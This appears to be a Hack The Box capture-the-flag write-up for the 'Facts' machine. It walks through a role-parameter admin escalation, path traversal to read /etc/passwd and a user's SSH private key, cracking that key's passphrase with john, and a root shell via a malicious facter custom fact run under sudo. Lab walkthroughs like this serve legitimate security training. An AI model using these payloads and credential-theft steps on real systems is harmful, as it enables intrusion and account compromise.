
# 3️⃣ Facts 


# 🧑‍💻 Hack The Box – Facts (Full Writeup)


---

## Enumeration

Nmap scan:

```bash
nmap -sC -sV facts.htb
````

Open ports:

* **22 → SSH**
* **80 → HTTP**

The HTTP service redirected to:

```
http://facts.htb
```

---

## Hosts Configuration

Add domain to hosts file.

### Windows

```powershell
Add-Content -Path "C:\Windows\System32\drivers\etc\hosts" `
-Value "10.129.12.122 facts.htb"
```

Flush DNS:

```powershell
ipconfig /flushdns
```

---

## Web Application Testing

Intercepted request while changing password.

Manipulated parameter:

```
password[role]=admin
```

This allowed **admin privilege escalation**.

---

## Path Traversal

Testing file access using:

```
../../../../../../etc/passwd
```

This revealed **system users**.

---

## Vulnerability Research

Found vulnerability:

```
CVE-2024-46987
```

GitHub PoC:

```
https://github.com/Goultarde/CVE-2024-46987
```

---

## Exploit Script

Run exploit:

```bash
python3 CVE-2024-46987.py \
-u http://facts.htb \
-l username \
-p password \
/etc/passwd
```

Discovered users:

```
trivia
william
```

---

## Arbitrary File Download

Endpoint vulnerable:

```
/admin/media/download_private_file
```

Example request:

```
http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/passwd
```

---

## Searching for SSH Keys

Common locations:

```
/home/trivia/.ssh/id_rsa
/home/trivia/.ssh/id_ed25519
/home/trivia/.ssh/authorized_keys
/home/trivia/.bash_history
/home/trivia/.env
```

Downloaded SSH key:

```
id_ed25519
```

---

## Cracking SSH Key

Convert to John format:

```bash
python3 ssh2john.py id_ed25519 > ssh.hash
```

Crack password:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
```

Password:

```
dragonballz
```

SSH login:

```bash
ssh -i id_ed25519 trivia@target
```

User flag obtained.

---

## Privilege Escalation

Check sudo permissions:

```bash
sudo -l
```

User can run:

```
facter
```

---

## Facter Exploit

Create malicious fact file.

Directory:

```
/tmp/facts
```

File:

```ruby
Facter.add(:pwn) do
  setcode do
    system("/bin/bash")
  end
end
```

Run facter:

```bash
sudo /usr/bin/facter --custom-dir /tmp/facts
```

Root shell obtained.

---

## Root Flag

```
/root/root.txt
```

---

## Skills Learned

* Path traversal
* Arbitrary file download
* SSH key cracking
* Ruby facter exploitation

